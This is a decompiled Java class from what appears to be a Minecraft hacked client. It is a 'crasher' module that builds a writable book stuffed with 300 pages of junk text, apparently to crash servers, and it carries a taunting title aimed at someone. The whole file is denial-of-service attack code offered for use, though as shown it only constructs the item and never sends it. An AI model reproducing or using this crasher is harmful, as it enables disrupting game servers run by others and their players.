// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class BookBypassCrasher
{
    public static void start() {
        final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        final String size = "blzqbuvjxvmswphhwenqgufshaiughkashkjghsakjhkjrjajhfkshakhgayhoahiuwfhawfhshafhas, fsaghgasjkgsabkjkfjnsahbfkjsahlkfhsa,sfjkahkfhsajgasj, hgfsajkhgjashghsaghaskhjgfas , oshgahgashgashgas, 85973198F(&S^A&(YR#@YA(6d978A(SYF(S^A(GAShc(SH(GFSA^(G&ASOHVSA&FGSA(GOIASSA&FG)US)GUSAJCSAY)GUS)(AUGS)CSAYG)SAU)CINSA)(YGSAY)CNSA)(HG()SYCSACHKSAHF(^&(^(F^SA(^(^(SF^(SA^(^(^(FSA^(^(RS(A^($^(Q#^($^Q(*^";
        for (int i = 0; i < 300; ++i) {
            final String siteContent = size;
            final NBTTagString tString = new NBTTagString(siteContent);
            list.appendTag(tString);
        }
        tag.setString("author", "N~");
        tag.setString("title", "STFU YOONIKS");
        tag.setTag("pages", list);
        book.setTagInfo("pages", list);
        book.setTagCompound(tag);
    }
}
